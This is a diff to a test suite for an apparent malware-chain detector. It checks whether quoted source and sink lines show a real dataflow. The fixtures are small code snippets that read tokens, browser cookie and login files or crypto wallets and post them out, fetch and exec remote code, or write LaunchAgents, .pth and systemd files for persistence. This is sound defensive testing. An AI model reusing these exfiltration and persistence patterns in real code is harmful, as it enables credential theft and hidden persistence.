@@ -164,7 +164,9 @@ def test_padding_lines_do_not_satisfy_connected():
 def test_an_end_with_no_anchor_line_fails_connected():
     text = "import os, requests\npass\nrequests.post(U)\n"
     v = _v(chain_source="pass", chain_sink="requests.post(U)")
-    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == "no dataflow shown between source and sink"
+    # P2c (task 8 fix round 2): Kind runs before Connected, so a padding-only end fails at Kind
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == \
+        "source quoted as secret-read, but the quoted lines show no secret-read"
 
 
 def test_names_excludes_keyword_argument_names_but_keeps_the_value():
@@ -176,7 +178,8 @@ def test_a_shared_keyword_argument_name_does_not_connect():
     # I2: `timeout=5` on both ends must not read as a shared identifier
     text = ("import subprocess, requests\ndef f():\n    r = requests.get(URL, timeout=5)\n"
             + "pass\n" * 60 + "def g():\n    subprocess.run(CMD, timeout=5)\n")
-    v = _v(chain_source="r = requests.get(URL, timeout=5)", chain_sink="subprocess.run(CMD, timeout=5)")
+    v = _v(chain_source="r = requests.get(URL, timeout=5)", chain_sink="subprocess.run(CMD, timeout=5)",
+           source_kind="fetch", sink_kind="exec")          # P2c: both ends show their Kind; Connected decides
     assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == "no dataflow shown between source and sink"
 
 
@@ -273,7 +276,7 @@ def test_a_continuation_line_kwarg_name_is_not_a_shared_identifier():
     text = ("import subprocess, requests\ndef f():\n    r = requests.get(URL,\n        timeout=5)\n"
             + "pass\n" * 60 + "def g():\n    subprocess.run(CMD, env=E,\n        timeout=9)\n")
     v = _v(chain_source="r = requests.get(URL,\n        timeout=5)",
-           chain_sink="subprocess.run(CMD, env=E,\n        timeout=9)")
+           chain_sink="subprocess.run(CMD, env=E,\n        timeout=9)", source_kind="fetch", sink_kind="exec")
     assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == "no dataflow shown between source and sink"
 
 
@@ -365,7 +368,9 @@ def test_string_content_on_an_assignment_opening_line_is_not_read_as_code():
     text = ('import os, requests\ntoken = os.getenv("K")\n' + "pass\n" * 80
             + 'HELP = """ requests.post(U, data=token)\nusage\n"""\n')
     v = _v(chain_source='token = os.getenv("K")', chain_sink='HELP = """ requests.post(U, data=token)')
-    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == "no dataflow shown between source and sink"
+    # P2c: Kind runs first; read as code, the string content would have shown a send
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == \
+        "sink quoted as send, but the quoted lines show no send"
 
 
 def test_the_round_2_closing_line_case_still_passes_via_tails():
@@ -487,7 +492,8 @@ def test_a_multiline_bytes_constant_counts_as_a_string():
     text = ('import os, requests\ntoken = os.getenv("K")\n' + "pass\n" * 80
             + 'B = (b"""\nx""" + """ requests.post(U, data=token)\nmore\n""")\n')
     v = _v(chain_source='token = os.getenv("K")', chain_sink='x""" + """ requests.post(U, data=token)')
-    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == "no dataflow shown between source and sink"
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == \
+        "sink quoted as send, but the quoted lines show no send"                  # P2c
     entry = reviewer._shown_entry(FileDiff("a.py", "modified", [], 'B = b"""\nx\n"""\n'), "build", whole=True)
     assert entry["strings"] == [2, 3]
 
@@ -673,12 +679,11 @@ def test_disallowed_pairs(sk, kk):
 
 
 def test_a_bundled_so_loaded_by_ctypes_is_held():
-    # user choice G2: no source kind covers a bundled member. `lib.run()` alone has no free name (I1: `lib` is
-    # only a receiver, `run` only an attribute), so Connected (Task 7) holds this before Kind is even reached --
-    # a deviation from the brief's expected reason, not a Kind/Pair bug.
+    # user choice G2: no source kind covers a bundled member. Kind runs before Connected (P2c), so the .so path
+    # fails payload evidence (before P2c, Connected held it first: `lib.run()` alone has no free name).
     text = "import ctypes\ndef f():\n    lib = ctypes.CDLL('./_native.so')\n    lib.run()\n"
     got = _one("pkg/a.py", text, "lib = ctypes.CDLL('./_native.so')", "lib.run()", "payload", "exec")
-    assert got == "no dataflow shown between source and sink"
+    assert got == "source quoted as payload, but the quoted lines show no payload"
 
 
 # ---- Task 7 context rulings (R8-1, R8-2) ----
@@ -715,7 +720,7 @@ def test_k1_stitch_evidence_and_connection_from_different_lines_is_held():
             + 'def f(c):\n    data = json.dumps(c)\n    requests.post(U, data=data)\n')
     got = _one("pkg/a.py", text, 'HOME = os.environ["HOME"]\ndata = json.dumps(c)',
                "requests.post(U, data=data)", "secret-read", "send")
-    assert got == "source quoted as secret-read, but the quoted lines show no secret-read"
+    assert got == "no dataflow shown between source and sink"   # P2c: the evidence group is kept; it does not connect
 
 
 def test_k1_a_real_source_and_an_adjacent_padding_line_do_not_stand_together():
@@ -725,7 +730,7 @@ def test_k1_a_real_source_and_an_adjacent_padding_line_do_not_stand_together():
             + 'def f(data):\n    x = 1\n    requests.post(U, data=data)\n')
     got = _one("pkg/a.py", text, 'token = os.getenv("GITHUB_TOKEN")\nx = 1',
                "requests.post(U, data=data)", "secret-read", "send")
-    assert got == "source quoted as secret-read, but the quoted lines show no secret-read"
+    assert got == "no dataflow shown between source and sink"   # P2c
 
 
 def test_k1_a_real_multiline_source_forms_one_group_and_passes():
@@ -814,3 +819,152 @@ def test_k2_import_table_splits_on_top_level_semicolon():
             "    p = urllib.request.urlopen(U).read()\n    sp.run(p)\n")
     got = _one("pkg/a.py", text, "p = urllib.request.urlopen(U).read()", "sp.run(p)", "fetch", "exec")
     assert got == ""
+
+
+# ---- Task 8 fix round 2 (rulings P1-P5) ----
+
+def test_p1_many_groups_on_both_ends_gate_in_linear_time():
+    # N1: 64 source copies x 64 sink copies over 1,385 lines was ~52 s (per-pair reader rebuild)
+    src = "".join(f"def s{i}():\n    k = os.environ['K']\n    return 1\n" for i in range(64))
+    snk = "".join(f"def t{i}(d):\n    requests.post(U, data=d)\n    return 1\n" for i in range(64))
+    shown = _shown("pkg/a.py", "import os, requests\n" + src + "z = 0\n" * 1000 + snk, cls="runtime-call")
+    assert len(shown["pkg/a.py"]["lines"]) == 1385
+    v = _v(chain_source="k = os.environ['K']", chain_sink="requests.post(U, data=d)")
+    t0 = time.perf_counter()
+    assert chain.gate(v, shown) == "no dataflow shown between source and sink"
+    assert time.perf_counter() - t0 < 1.0
+
+
+def test_p1_two_hundred_copies_of_both_ends_in_five_thousand_lines():
+    src = "".join(f"def s{i}():\n    k = os.environ['K']\n    return 1\n" for i in range(200))
+    snk = "".join(f"def t{i}(d):\n    requests.post(U, data=d)\n    return 1\n" for i in range(200))
+    shown = _shown("pkg/a.py", "import os, requests\n" + src + "print(k)\n" * 3800 + snk, cls="runtime-call")
+    assert len(shown["pkg/a.py"]["lines"]) >= 5000
+    v = _v(chain_source="k = os.environ['K']", chain_sink="requests.post(U, data=d)")
+    t0 = time.perf_counter()
+    assert chain.gate(v, shown) == "no dataflow shown between source and sink"
+    assert time.perf_counter() - t0 < 2.0
+
+
+@pytest.mark.parametrize("n", [64, 500])
+def test_p2_decoy_sink_copies_above_the_real_chain_do_not_force_a_downgrade(n):
+    decoys = "".join(f"def d{i}(body):\n    requests.post(U, json=body)\n    return 1\n" for i in range(n))
+    text = ("import os, requests\n" + decoys
+            + "def real(body):\n    k = os.environ['K']\n    body = {'k': k}\n    requests.post(U, json=body)\n")
+    v = _v(chain_source="k = os.environ['K']", chain_sink="requests.post(U, json=body)")
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == ""
+
+
+@pytest.mark.parametrize("n", [64, 500])
+def test_p2_decoy_source_copies_above_the_real_chain_do_not_force_a_downgrade(n):
+    decoys = "".join(f"def d{i}():\n    stash(os.environ)\n    return 1\n" for i in range(n))
+    text = ("import os, requests\n" + decoys
+            + "def real(body):\n    stash(os.environ)\n    requests.post(U, json=body)\n")
+    v = _v(chain_source="stash(os.environ)", chain_sink="requests.post(U, json=body)")
+    assert chain.gate(v, _shown("pkg/a.py", text, cls="runtime-call")) == ""
+
+
+def test_p2_a_padding_line_next_to_the_sink_still_fails():
+    # probe7c: `x = 1` quoted with the real far source, placed right before the sink; it shows no secret-read
+    body = ["import os, requests", "token = os.getenv('GITHUB_TOKEN')"] + ["pass"] * 518 + [
+        "x = 1", "requests.post(API, json=report)"]
+    v = _v(chain_source="token = os.getenv('GITHUB_TOKEN')\nx = 1", chain_sink="requests.post(API, json=report)")
+    assert chain.gate(v, _shown("pkg/a.py", "\n".join(body) + "\n", cls="runtime-call")) == \
+        "no dataflow shown between source and sink"
+
+
+def test_p2_no_sink_group_with_sink_kind_evidence_gives_the_sink_kind_reason():
+    text = "import os\ndef f():\n    k = os.environ['K']\n    log(k)\n"
+    assert _one("pkg/a.py", text, "k = os.environ['K']", "log(k)", "secret-read", "send") == \
+        "sink quoted as send, but the quoted lines show no send"
+
+
+_BLACK = ('import os, requests\ndef f():\n    token = os.environ.get(\n        "GITHUB_TOKEN",\n        "",\n    )\n'
+          '    x = 1\n' + "    y = 2\n" * 60
+          + '    requests.post(\n        "https://x.invalid/c",\n        data=token,\n        timeout=5,\n    )\n')
+
+
+@pytest.mark.parametrize("source, sink", [
+    ('token = os.environ.get(\n"GITHUB_TOKEN",\n"",\n)',
+     'requests.post(\n"https://x.invalid/c",\ndata=token,\ntimeout=5,\n)'),
+    ('token = os.environ.get(\n"GITHUB_TOKEN",\n)', "requests.post(\ndata=token,\n)"),
+], ids=["whole-statements", "elided-lines"])
+def test_p3a_an_open_bracket_group_merges_with_the_next_group_of_its_statement(source, sink):
+    assert _one("pkg/a.py", _BLACK, source, sink, "secret-read", "send") == ""
+
+
+def test_p3a_an_open_group_does_not_merge_past_the_end_of_its_statement():
+    # deviation guard: `data = json.dumps(` opens, but its statement closes (`c)`) before the far secret line
+    text = ('import os, json, requests\ndef f(c):\n    data = json.dumps(\n        c)\n'
+            '    requests.post(U, data=data)\n' + "pass\n" * 80 + 'HOME = os.environ["HOME"]\n')
+    got = _one("pkg/a.py", text, 'data = json.dumps(\nHOME = os.environ["HOME"]', "requests.post(U, data=data)",
+               "secret-read", "send")
+    assert got == "no dataflow shown between source and sink"
+
+
+def test_p3b_a_later_group_reading_a_name_bound_earlier_merges_payload_blob_and_decoder():
+    text = f"_B = 'Ab1{'QUJD' * 40}'\n_n = 3\n_D = _unpack(_B)\n" + "pass\n" * 60 + "def run():\n    exec(_D)\n"
+    got = _one("pkg/__init__.py", text, f"_B = 'Ab1{'QUJD' * 40}'\n_D = _unpack(_B)", "exec(_D)", "payload", "exec",
+               cls="import")
+    assert got == ""
+
+
+def test_p3b_a_quoted_module_relay_line_merges_with_the_secret_read():
+    text = ("import os, requests\nTOKEN = os.environ['K']\n" + "pass\n" * 80 + "BODY = {'t': TOKEN}\n" + "pass\n" * 60
+            + "def send():\n    requests.post(U, json=BODY)\n")
+    got = _one("pkg/a.py", text, "TOKEN = os.environ['K']\nBODY = {'t': TOKEN}", "requests.post(U, json=BODY)",
+               "secret-read", "send")
+    assert got == ""
+
+
+def test_p4_a_group_bridges_at_most_three_comment_lines():
+    lines = {1: "a = 1", 2: "# c", 3: "  ", 4: "# c", 5: "b = 2"}
+    assert chain._groups([[1, 5]], lines) == [[1, 5]]
+    lines = {1: "a = 1", 2: "# c", 3: "# c", 4: "# c", 5: "# c", 6: "b = 2"}
+    assert chain._groups([[1, 6]], lines) == [[1], [6]]
+
+
+def test_p4_a_module_stitch_through_eighty_comment_lines_fails():
+    text = ('import os, requests, json\nHOME = os.environ["HOME"]\n' + "# pad\n" * 80 + "data = json.dumps(C)\n"
+            + "pass\n" * 60 + "def f():\n    requests.post(U, data=data)\n")
+    got = _one("pkg/a.py", text, 'HOME = os.environ["HOME"]\ndata = json.dumps(C)', "requests.post(U, data=data)",
+               "secret-read", "send")
+    assert got == "no dataflow shown between source and sink"
+
+
+@pytest.mark.parametrize("src", [
+    "k = open(os.path.join(H, '.electrum', 'wallets', 'default_wallet')).read()",
+    "k = open(os.path.join(p, 'cookies.sqlite'), 'rb').read()",
+    "k = open(os.path.join(p, 'exodus.wallet')).read()",
+    "k = open(os.path.join(p, 'logins.json')).read()",
+])
+def test_p5_cred_lowercase_paths(src):
+    text = f"import os, requests\ndef f(H, p):\n    {src}\n    requests.post(U, data=k)\n"
+    assert _one("pkg/a.py", text, src, "requests.post(U, data=k)", "secret-read", "send") == ""
+
+
+@pytest.mark.parametrize("sink, ok", [
+    ("open(os.path.join(HOME, 'Library', 'LaunchAgents', 'x.plist'), 'w').write(b)", True),
+    ("open(os.path.join(HOME, 'Library/LaunchAgents', 'x.plist'), 'w').write(b)", True),
+    ("open(os.path.join(sp, 'evil.PTH'), 'w').write(b)", True),
+    ("open(os.path.join('/etc/systemd/system', 'x.service'), 'w').write(b)", True),
+    ("open(os.path.join(d, 'x.service'), 'w').write(b)", False),
+    ("open(os.path.join(d, 'MyLaunchAgentsX'), 'w').write(b)", False),
+])
+def test_p5_persist_paths(sink, ok):
+    text = f"import os, urllib.request\ndef f(HOME, sp, d):\n    b = urllib.request.urlopen(U).read()\n    {sink}\n"
+    got = _one("pkg/a.py", text, "b = urllib.request.urlopen(U).read()", sink, "fetch", "write-and-run")
+    assert (got == "") is ok, (sink, got)
+
+
+@pytest.mark.parametrize("sink, ok", [
+    ("ftplib.FTP_TLS(H).storbinary('STOR x', k)", True),
+    ("urllib.request.build_opener().open(U, data=k)", True),
+    ("urllib.request.opener.open(U, data=k)", True),
+    ("open(k, 'w')", False),
+    ("io.open(U, k)", False),
+])
+def test_p5_network_primitives(sink, ok):
+    text = f"import os, ftplib, io, urllib.request\ndef f(H):\n    k = os.environ['K']\n    {sink}\n"
+    got = _one("pkg/a.py", text, "k = os.environ['K']", sink, "secret-read", "send")
+    assert (got == "") is ok, (sink, got)
